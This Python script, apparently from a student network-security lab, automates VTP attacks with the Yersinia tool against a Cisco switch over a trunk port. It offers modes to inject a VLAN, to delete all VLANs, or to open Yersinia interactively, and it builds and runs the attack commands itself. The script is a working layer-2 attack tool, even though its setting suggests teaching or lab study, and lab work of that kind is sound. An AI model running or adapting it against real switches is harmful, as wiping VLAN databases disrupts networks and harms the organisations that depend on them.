#!/usr/bin/env python3
# VTP ATTACK CON YERSINIA | Matricula: 2023-0316 | ITLA
# Topologia: Kali eth0 <-> SW-CORE Gig0/1 (trunk)
#
# Instalar yersinia si falta:
#   sudo apt install yersinia
#
# Uso:
#   sudo python3 vtp_attack_yersinia.py -a agregar
#   sudo python3 vtp_attack_yersinia.py -a borrar
#   sudo python3 vtp_attack_yersinia.py -a interactivo

import subprocess, argparse, sys, os, time

INTERFAZ = "eth0"
DURACION  = 5   # segundos que Yersinia envia el ataque

def banner():
    print("""
+--------------------------------------------------+
|  VTP ATTACK (YERSINIA) | Matricula: 2023-0316   |
|  ITLA - Laboratorio de Seguridad en Redes        |
|  Kali eth0 -> SW-CORE Gig0/1 (trunk)            |
+--------------------------------------------------+
""")

def verificar_yersinia():
    r = subprocess.run(["which", "yersinia"], capture_output=True, text=True)
    if r.returncode != 0:
        print("[!] Yersinia no encontrado. Instalar con:")
        print("    sudo apt install yersinia")
        sys.exit(1)
    print("[+] Yersinia encontrado:", r.stdout.strip())

def verificar_interfaz(iface):
    r = subprocess.run(["ip", "link", "show", iface], capture_output=True, text=True)
    if r.returncode != 0:
        print(f"[!] Interfaz {iface} no encontrada.")
        sys.exit(1)
    if "UP" not in r.stdout:
        print(f"[*] Activando {iface}...")
        subprocess.run(["ip", "link", "set", iface, "up"])
        time.sleep(1)
    print(f"[+] Interfaz {iface} activa")

def lanzar_ataque(iface, ataque_num, desc):
    """
    Usa el comando timeout del sistema para correr Yersinia
    exactamente DURACION segundos y luego matarlo.
    Esto evita que Yersinia se quede colgado esperando.
    """
    print(f"\n[ATAQUE] {desc} en {iface}")
    print(f"  Duracion: {DURACION} segundos\n")

    # timeout <segundos> yersinia vtp -attack <N> -interface <iface>
    cmd = [
        "timeout", str(DURACION),
        "yersinia", "vtp",
        "-attack", str(ataque_num),
        "-interface", iface
    ]

    print(f"[*] Ejecutando: {chr(32).join(cmd)}")
    r = subprocess.run(cmd, capture_output=True, text=True)

    # timeout devuelve 124 si mato el proceso (comportamiento normal)
    if r.returncode in [0, 124]:
        print(f"[+] Ataque enviado durante {DURACION}s correctamente")
    else:
        print(f"[!] Yersinia retorno codigo {r.returncode}")

    if r.stdout: print(r.stdout)
    if r.stderr: print(r.stderr)

    print("\n[+] Verificar en el switch:")
    print("    show vlan brief")
    print("    show vtp status")

def ataque_interactivo(iface):
    """
    Abre Yersinia en modo ncurses para control manual.
    Teclas dentro de Yersinia:
      g = seleccionar protocolo -> elegir VTP
      x = ver ataques disponibles
      q = salir
    """
    print(f"\n[INTERACTIVO] Abriendo Yersinia en {iface}")
    print("  g = protocolo | x = ataques | q = salir\n")
    subprocess.run(["yersinia", "-I", "-interface", iface])

def main():
    banner()
    p = argparse.ArgumentParser(description="VTP Yersinia | 2023-0316 | ITLA")
    p.add_argument("-i", "--interfaz", default=INTERFAZ)
    p.add_argument("-a", "--accion",
                   choices=["agregar", "borrar", "interactivo"],
                   required=True)
    p.add_argument("-t", "--tiempo", type=int, default=DURACION,
                   help=f"Segundos que dura el ataque (default: {DURACION})")
    a = p.parse_args()

    global DURACION
    DURACION = a.tiempo

    print(f"Interfaz : {a.interfaz}")
    print(f"Accion   : {a.accion}")
    print(f"Duracion : {DURACION}s\n")

    verificar_yersinia()
    verificar_interfaz(a.interfaz)

    if a.accion == "agregar":
        # attack 1 = Adding a VLAN
        lanzar_ataque(a.interfaz, 1, "Agregando VLAN via VTP")
    elif a.accion == "borrar":
        # attack 2 = Deleting all VLANs
        lanzar_ataque(a.interfaz, 2, "Borrando todas las VLANs via VTP")
    elif a.accion == "interactivo":
        ataque_interactivo(a.interfaz)

if __name__ == "__main__":
    if os.geteuid() != 0: sys.exit("[!] Ejecutar con sudo")
    main()
